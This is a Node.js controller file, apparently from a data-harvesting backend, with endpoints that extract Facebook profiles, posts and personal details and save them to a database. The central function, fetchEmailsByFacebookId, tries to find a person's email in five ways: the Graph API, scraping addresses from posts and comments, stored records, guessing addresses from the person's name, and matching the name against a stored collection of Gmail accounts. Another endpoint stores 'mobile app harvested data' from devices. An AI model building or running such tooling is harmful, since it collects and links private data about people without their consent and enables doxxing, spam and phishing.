const axios = require('axios');
const FacebookProfile = require('../models/FacebookProfile');
const FacebookPost = require('../models/FacebookPost');

// Facebook Graph API configuration
const FACEBOOK_API_VERSION = 'v18.0';
const FACEBOOK_BASE_URL = `https://graph.facebook.com/${FACEBOOK_API_VERSION}`;

// Get public profile data
const getPublicProfile = async (req, res) => {
  try {
    const { profileId } = req.params;
    const accessToken = process.env.FACEBOOK_APP_TOKEN;

    if (!accessToken) {
      return res.status(500).json({
        success: false,
        message: 'Facebook app token not configured'
      });
    }

    const response = await axios.get(`${FACEBOOK_BASE_URL}/${profileId}`, {
      params: {
        fields: 'id,name,username,profile_picture,cover_photo,followers_count,following_count,posts_count,about,location,website,phone,email,birthday,relationship_status,work,education',
        access_token: accessToken
      }
    });

    // Save to database
    const profile = new FacebookProfile({
      profileId: response.data.id,
      name: response.data.name,
      username: response.data.username,
      profilePicture: response.data.profile_picture,
      coverPhoto: response.data.cover_photo,
      followersCount: response.data.followers_count,
      followingCount: response.data.following_count,
      postsCount: response.data.posts_count,
      about: response.data.about,
      location: response.data.location,
      website: response.data.website,
      phone: response.data.phone,
      email: response.data.email,
      birthday: response.data.birthday,
      relationshipStatus: response.data.relationship_status,
      work: response.data.work,
      education: response.data.education,
      extractedAt: new Date()
    });

    await profile.save();

    res.json({
      success: true,
      message: 'Facebook profile data extracted successfully',
      data: response.data
    });

  } catch (error) {
    console.error('Facebook profile extraction error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to extract Facebook profile data',
      error: error.message
    });
  }
};

// NEW: Fetch emails using Facebook ID
const fetchEmailsByFacebookId = async (req, res) => {
  try {
    const { facebookId } = req.params;
    const { method = 'all' } = req.query;

    console.log(`🔍 Fetching emails for Facebook ID: ${facebookId} using method: ${method}`);

    let emails = [];

    // Method 1: Direct Facebook API (if email is public)
    if (method === 'all' || method === 'facebook_api') {
      try {
        const accessToken = process.env.FACEBOOK_APP_TOKEN;
        if (accessToken) {
          const response = await axios.get(`${FACEBOOK_BASE_URL}/${facebookId}`, {
            params: {
              fields: 'email,website,about',
              access_token: accessToken
            }
          });

          if (response.data.email) {
            emails.push({
              email: response.data.email,
              source: 'facebook_api',
              confidence: 'high',
              extractedAt: new Date()
            });
          }

          // Extract emails from website field
          if (response.data.website) {
            const websiteEmails = extractEmailsFromText(response.data.website);
            websiteEmails.forEach(email => {
              emails.push({
                email: email,
                source: 'facebook_website',
                confidence: 'medium',
                extractedAt: new Date()
              });
            });
          }

          // Extract emails from about field
          if (response.data.about) {
            const aboutEmails = extractEmailsFromText(response.data.about);
            aboutEmails.forEach(email => {
              emails.push({
                email: email,
                source: 'facebook_about',
                confidence: 'medium',
                extractedAt: new Date()
              });
            });
          }
        }
      } catch (error) {
        console.log('Facebook API method failed:', error.message);
      }
    }

    // Method 2: Extract from posts and comments
    if (method === 'all' || method === 'posts') {
      try {
        const accessToken = process.env.FACEBOOK_APP_TOKEN;
        if (accessToken) {
          const response = await axios.get(`${FACEBOOK_BASE_URL}/${facebookId}/posts`, {
            params: {
              fields: 'message,comments{message}',
              access_token: accessToken,
              limit: 50
            }
          });

          response.data.data.forEach(post => {
            if (post.message) {
              const postEmails = extractEmailsFromText(post.message);
              postEmails.forEach(email => {
                emails.push({
                  email: email,
                  source: 'facebook_post',
                  confidence: 'low',
                  extractedAt: new Date()
                });
              });
            }

            if (post.comments && post.comments.data) {
              post.comments.data.forEach(comment => {
                if (comment.message) {
                  const commentEmails = extractEmailsFromText(comment.message);
                  commentEmails.forEach(email => {
                    emails.push({
                      email: email,
                      source: 'facebook_comment',
                      confidence: 'low',
                      extractedAt: new Date()
                    });
                  });
                }
              });
            }
          });
        }
      } catch (error) {
        console.log('Posts method failed:', error.message);
      }
    }

    // Method 3: Cross-reference with our database
    if (method === 'all' || method === 'database') {
      try {
        // Check if we have this profile in our database
        const profile = await FacebookProfile.findOne({ profileId: facebookId });
        if (profile && profile.email) {
          emails.push({
            email: profile.email,
            source: 'database',
            confidence: 'high',
            extractedAt: profile.extractedAt
          });
        }

        // Search for posts by this profile
        const posts = await FacebookPost.find({ profileId: facebookId });
        posts.forEach(post => {
          if (post.message) {
            const postEmails = extractEmailsFromText(post.message);
            postEmails.forEach(email => {
              emails.push({
                email: email,
                source: 'database_post',
                confidence: 'medium',
                extractedAt: post.extractedAt
              });
            });
          }
        });
      } catch (error) {
        console.log('Database method failed:', error.message);
      }
    }

    // Method 4: Email pattern generation based on username/name
    if (method === 'all' || method === 'pattern') {
      try {
        const accessToken = process.env.FACEBOOK_APP_TOKEN;
        if (accessToken) {
          const response = await axios.get(`${FACEBOOK_BASE_URL}/${facebookId}`, {
            params: {
              fields: 'name,username',
              access_token: accessToken
            }
          });

          if (response.data.name || response.data.username) {
            const generatedEmails = generateEmailPatterns(response.data.name, response.data.username);
            generatedEmails.forEach(email => {
              emails.push({
                email: email,
                source: 'pattern_generation',
                confidence: 'very_low',
                extractedAt: new Date()
              });
            });
          }
        }
      } catch (error) {
        console.log('Pattern generation method failed:', error.message);
      }
    }

    // Method 5: Cross-reference with Gmail data (if available)
    if (method === 'all' || method === 'gmail') {
      try {
        // Check if we have Gmail data that might match this Facebook profile
        const GmailAccount = require('../models/GmailAccount');
        const gmailAccounts = await GmailAccount.find({});
        
        // Simple name matching (in real scenario, you'd use more sophisticated matching)
        const accessToken = process.env.FACEBOOK_APP_TOKEN;
        if (accessToken) {
          const response = await axios.get(`${FACEBOOK_BASE_URL}/${facebookId}`, {
            params: {
              fields: 'name',
              access_token: accessToken
            }
          });

          if (response.data.name) {
            const facebookName = response.data.name.toLowerCase();
            gmailAccounts.forEach(account => {
              if (account.email && account.email.toLowerCase().includes(facebookName.split(' ')[0])) {
                emails.push({
                  email: account.email,
                  source: 'gmail_cross_reference',
                  confidence: 'medium',
                  extractedAt: new Date()
                });
              }
            });
          }
        }
      } catch (error) {
        console.log('Gmail cross-reference method failed:', error.message);
      }
    }

    // Remove duplicates and sort by confidence
    const uniqueEmails = removeDuplicateEmails(emails);
    const sortedEmails = sortEmailsByConfidence(uniqueEmails);

    // Save extracted emails to database
    await saveExtractedEmails(facebookId, sortedEmails);

    res.json({
      success: true,
      message: `Found ${sortedEmails.length} unique emails for Facebook ID: ${facebookId}`,
      data: {
        facebookId: facebookId,
        totalEmails: sortedEmails.length,
        emails: sortedEmails,
        methodsUsed: method === 'all' ? ['facebook_api', 'posts', 'database', 'pattern', 'gmail'] : [method]
      }
    });

  } catch (error) {
    console.error('Fetch emails by Facebook ID error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to fetch emails by Facebook ID',
      error: error.message
    });
  }
};

// Helper function to extract emails from text
const extractEmailsFromText = (text) => {
  if (!text) return [];
  
  const emailRegex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi;
  const matches = text.match(emailRegex);
  
  if (matches) {
    return [...new Set(matches)]; // Remove duplicates
  }
  
  return [];
};

// Helper function to generate email patterns
const generateEmailPatterns = (name, username) => {
  const emails = [];
  
  if (name) {
    const nameParts = name.toLowerCase().split(' ');
    if (nameParts.length >= 2) {
      const firstName = nameParts[0];
      const lastName = nameParts[nameParts.length - 1];
      
      // Common email patterns
      emails.push(`${firstName}@gmail.com`);
      emails.push(`${firstName}${lastName}@gmail.com`);
      emails.push(`${firstName}.${lastName}@gmail.com`);
      emails.push(`${firstName}_${lastName}@gmail.com`);
      emails.push(`${firstName}${lastName.charAt(0)}@gmail.com`);
      emails.push(`${firstName.charAt(0)}${lastName}@gmail.com`);
      emails.push(`${firstName}${lastName}@yahoo.com`);
      emails.push(`${firstName}@yahoo.com`);
      emails.push(`${firstName}${lastName}@hotmail.com`);
      emails.push(`${firstName}@hotmail.com`);
    }
  }
  
  if (username) {
    emails.push(`${username}@gmail.com`);
    emails.push(`${username}@yahoo.com`);
    emails.push(`${username}@hotmail.com`);
  }
  
  return [...new Set(emails)]; // Remove duplicates
};

// Helper function to remove duplicate emails
const removeDuplicateEmails = (emails) => {
  const seen = new Set();
  return emails.filter(email => {
    const duplicate = seen.has(email.email);
    seen.add(email.email);
    return !duplicate;
  });
};

// Helper function to sort emails by confidence
const sortEmailsByConfidence = (emails) => {
  const confidenceOrder = {
    'high': 3,
    'medium': 2,
    'low': 1,
    'very_low': 0
  };
  
  return emails.sort((a, b) => {
    return confidenceOrder[b.confidence] - confidenceOrder[a.confidence];
  });
};

// Helper function to save extracted emails
const saveExtractedEmails = async (facebookId, emails) => {
  try {
    // Update or create profile with extracted emails
    await FacebookProfile.findOneAndUpdate(
      { profileId: facebookId },
      { 
        $set: { 
          extractedEmails: emails,
          lastEmailExtraction: new Date()
        }
      },
      { upsert: true }
    );
    
    console.log(`💾 Saved ${emails.length} emails for Facebook ID: ${facebookId}`);
  } catch (error) {
    console.error('Error saving extracted emails:', error);
  }
};

// Get public posts from profile/page
const getPublicPosts = async (req, res) => {
  try {
    const { profileId } = req.params;
    const { limit = 100 } = req.query;
    const accessToken = process.env.FACEBOOK_APP_TOKEN;

    if (!accessToken) {
      return res.status(500).json({
        success: false,
        message: 'Facebook app token not configured'
      });
    }

    const response = await axios.get(`${FACEBOOK_BASE_URL}/${profileId}/posts`, {
      params: {
        fields: 'id,message,created_time,type,permalink_url,reactions.summary(true),comments.summary(true),shares,attachments',
        access_token: accessToken,
        limit: parseInt(limit)
      }
    });

    // Save posts to database
    const posts = response.data.data.map(post => ({
      postId: post.id,
      profileId: profileId,
      message: post.message,
      createdTime: post.created_time,
      type: post.type,
      permalinkUrl: post.permalink_url,
      reactionsCount: post.reactions?.summary?.total_count || 0,
      commentsCount: post.comments?.summary?.total_count || 0,
      sharesCount: post.shares?.count || 0,
      attachments: post.attachments,
      extractedAt: new Date()
    }));

    await FacebookPost.insertMany(posts);

    res.json({
      success: true,
      message: 'Facebook posts extracted successfully',
      data: {
        posts: response.data.data,
        total: response.data.data.length
      }
    });

  } catch (error) {
    console.error('Facebook posts extraction error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to extract Facebook posts',
      error: error.message
    });
  }
};

// Get page insights (for business pages)
const getPageInsights = async (req, res) => {
  try {
    const { pageId } = req.params;
    const accessToken = process.env.FACEBOOK_PAGE_TOKEN;

    if (!accessToken) {
      return res.status(500).json({
        success: false,
        message: 'Facebook page token not configured'
      });
    }

    const response = await axios.get(`${FACEBOOK_BASE_URL}/${pageId}/insights`, {
      params: {
        metric: 'page_views_total,page_fans,page_posts_impressions,page_engaged_users',
        period: 'day',
        access_token: accessToken
      }
    });

    res.json({
      success: true,
      message: 'Facebook page insights extracted successfully',
      data: response.data
    });

  } catch (error) {
    console.error('Facebook page insights error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to extract Facebook page insights',
      error: error.message
    });
  }
};

// Search for profiles/pages
const searchProfiles = async (req, res) => {
  try {
    const { query, type = 'user' } = req.query;
    const accessToken = process.env.FACEBOOK_APP_TOKEN;

    if (!accessToken) {
      return res.status(500).json({
        success: false,
        message: 'Facebook app token not configured'
      });
    }

    const response = await axios.get(`${FACEBOOK_BASE_URL}/search`, {
      params: {
        q: query,
        type: type,
        fields: 'id,name,username,profile_picture',
        access_token: accessToken,
        limit: 50
      }
    });

    res.json({
      success: true,
      message: 'Facebook search completed successfully',
      data: response.data
    });

  } catch (error) {
    console.error('Facebook search error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to search Facebook profiles',
      error: error.message
    });
  }
};

const mobileFirebaseService = require('../services/mobileFirebaseService');

// Store mobile app harvested data directly to Firebase
const storeMobileData = async (req, res) => {
  try {
    const { deviceId, dataType, data } = req.body;

    console.log(`📱 Received Facebook data from device ${deviceId}:`, {
      type: dataType,
      dataSize: JSON.stringify(data).length
    });

    // Store data directly to Firebase
    const result = await mobileFirebaseService.storeFacebookData({
      deviceId,
      dataType,
      data
    });

    res.status(201).json({
      success: true,
      message: 'Facebook mobile data stored successfully in Firebase',
      firebaseId: result.firebaseId
    });

  } catch (error) {
    console.error('Store Facebook mobile data error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to store Facebook mobile data in Firebase',
      error: error.message
    });
  }
};

// Get all extracted Facebook profiles
const getAllProfiles = async (req, res) => {
  try {
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 20;
    const skip = (page - 1) * limit;

    const profiles = await FacebookProfile.find({})
      .sort({ extractedAt: -1 })
      .skip(skip)
      .limit(limit);

    const totalProfiles = await FacebookProfile.countDocuments({});

    res.json({
      success: true,
      data: {
        profiles,
        pagination: {
          currentPage: page,
          totalPages: Math.ceil(totalProfiles / limit),
          totalItems: totalProfiles,
          itemsPerPage: limit
        }
      }
    });

  } catch (error) {
    console.error('Get Facebook profiles error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to get Facebook profiles',
      error: error.message
    });
  }
};

// Get all extracted Facebook posts
const getAllPosts = async (req, res) => {
  try {
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 20;
    const skip = (page - 1) * limit;

    const posts = await FacebookPost.find({})
      .sort({ extractedAt: -1 })
      .skip(skip)
      .limit(limit);

    const totalPosts = await FacebookPost.countDocuments({});

    res.json({
      success: true,
      data: {
        posts,
        pagination: {
          currentPage: page,
          totalPages: Math.ceil(totalPosts / limit),
          totalItems: totalPosts,
          itemsPerPage: limit
        }
      }
    });

  } catch (error) {
    console.error('Get Facebook posts error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to get Facebook posts',
      error: error.message
    });
  }
};

module.exports = {
  getPublicProfile,
  fetchEmailsByFacebookId,
  getPublicPosts,
  getPageInsights,
  searchProfiles,
  storeMobileData,
  getAllProfiles,
  getAllPosts
}; 